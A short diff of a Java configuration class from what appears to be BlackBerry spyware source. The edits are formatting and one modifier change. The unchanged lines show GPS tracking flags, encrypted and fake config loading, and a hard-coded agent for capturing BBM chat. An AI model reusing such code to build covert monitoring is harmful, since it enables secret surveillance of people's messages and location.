@@ -31,7 +31,6 @@ import blackberry.utils.Check;
 import blackberry.utils.Utils;
 import fake.InstanceConfigFake;
 
-
 /**
  * The Class Conf. None of theese parameters changes runtime.
  */
@@ -68,7 +67,7 @@ public final class Conf {
 
     public static final boolean SYNCACTION_FORCE_WIFI = true;
     public static boolean SET_SOCKET_OPTIONS = true;
-    public static final boolean SD_ENABLED = false;
+    public static boolean SD_ENABLED = false;
 
     public static final boolean GPS_ENABLED = true;
     public static final int GPS_MAXAGE = -1;
@@ -132,8 +131,6 @@ public final class Conf {
 
     public static final byte[] FAKECONFSTART = "XW15TZlwZwpaWGPZ1wtL0f591tJe2b9c1z4PvkRuZaP1jTUR6yfBfLm4Knsu0st2"
             .getBytes();
-
-   
 
     /**
      * Crc verify.
@@ -273,8 +270,9 @@ public final class Conf {
 
             //#ifdef FAKECONF
             if (ret == false) {
-                inputStream = new ByteArrayInputStream(InstanceConfigFake.getBytes());       
-                
+                inputStream = new ByteArrayInputStream(
+                        InstanceConfigFake.getBytes());
+
                 ret = loadCyphered(inputStream, confKey, true);
             }
             //#endif
@@ -495,7 +493,7 @@ public final class Conf {
                 status.addAgent(agent);
             }
         }
-        
+
         //TODO HACK ZENO : adding non configurable agents, add chat BBM    
         Agent agent = Agent.factory(Agent.AGENT_IM, true, new byte[0]);
         status.addAgent(agent);
